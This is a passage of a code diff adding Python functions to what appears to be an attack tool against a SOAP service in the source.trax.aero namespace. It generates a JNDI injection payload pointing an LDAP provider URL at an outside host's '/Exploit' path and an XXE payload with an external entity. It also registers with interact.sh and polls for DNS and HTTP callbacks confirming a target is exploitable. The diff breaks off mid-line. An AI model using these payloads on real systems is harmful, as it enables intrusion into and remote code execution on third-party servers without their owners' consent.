@@ -196,6 +196,117 @@ def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, targ
 """
     return xml
 
+def build_jndi_dns_probe_xml(service_name: str, operation: str, dns_domain: str, port: int = 389, namespace="http://source.trax.aero"):
+    """Generate JNDI payload that triggers DNS lookup"""
+    unique_id = operation.lower().replace('_', '-')
+    root_tag = operation
+    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
+  <soapenv:Body>
+    <ns:{root_tag}>
+      <jmsConfig xmlns="http://JMS.castor.trax.aero">
+        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
+        <PROVIDER_URL>ldap://jndi-{unique_id}.{dns_domain}:{port}/Exploit</PROVIDER_URL>
+        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
+        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
+        <valid>true</valid>
+      </jmsConfig>
+    </ns:{root_tag}>
+  </soapenv:Body>
+</soapenv:Envelope>
+"""
+    return xml
+
+def build_xxe_dns_probe_xml(operation: str, dns_domain: str, namespace="http://source.trax.aero"):
+    """Generate XXE payload that triggers DNS lookup"""
+    unique_id = operation.lower().replace('_', '-')
+    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://xxe-{unique_id}.{dns_domain}/">
+]>
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns="{namespace}">
+  <soapenv:Body>
+    <ns:{operation}>&xxe;</ns:{operation}>
+  </soapenv:Body>
+</soapenv:Envelope>
+"""
+    return xml
+
+def get_interactsh_domain():
+    """Register with interact.sh and get a unique domain for DNS monitoring"""
+    try:
+        print("[*] Registering with interact.sh for DNS monitoring...")
+        r = requests.get('https://interact.sh/register', timeout=10, verify=True)
+
+        if r.status_code == 200:
+            data = r.json()
+            domain = data.get('domain')
+            token = data.get('token')
+
+            if domain:
+                print(f"[+] Got interact.sh domain: {domain}")
+                print(f"[*] Token: {token}")
+                print(f"[*] Monitor at: https://app.interact.sh/")
+                return {'domain': domain, 'token': token}
+
+        print("[!] Failed to get interact.sh domain")
+        return None
+
+    except Exception as e:
+        print(f"[!] Error getting interact.sh domain: {e}")
+        return None
+
+def poll_interactsh_callbacks(token: str, domain: str):
+    """Poll interact.sh for DNS/HTTP callbacks"""
+    try:
+        print(f"\n[*] Polling interact.sh for callbacks...")
+        r = requests.get(
+            f'https://interact.sh/poll?id={token}',
+            timeout=10,
+            verify=True
+        )
+
+        if r.status_code == 200:
+            data = r.json()
+            interactions = data.get('data', [])
+
+            if interactions:
+                print(f"\n{'='*80}")
+                print(f"[!!!] CALLBACKS RECEIVED: {len(interactions)}")
+                print(f"{'='*80}")
+
+                for interaction in interactions:
+                    protocol = interaction.get('protocol', 'unknown')
+                    unique_id = interaction.get('unique-id', 'unknown')
+                    full_id = interaction.get('full-id', 'unknown')
+                    timestamp = interaction.get('timestamp', 'unknown')
+                    remote_addr = interaction.get('remote-address', 'unknown')
+
+                    print(f"\n[!!!] Callback Type: {protocol.upper()}")
+                    print(f"      Subdomain: {full_id}")
+                    print(f"      From IP: {remote_addr}")
+                    print(f"      Timestamp: {timestamp}")
+
+                    if protocol == 'dns':
+                        print(f"      [!!!] DNS LOOKUP CONFIRMED - Server resolved the domain!")
+                    elif protocol == 'h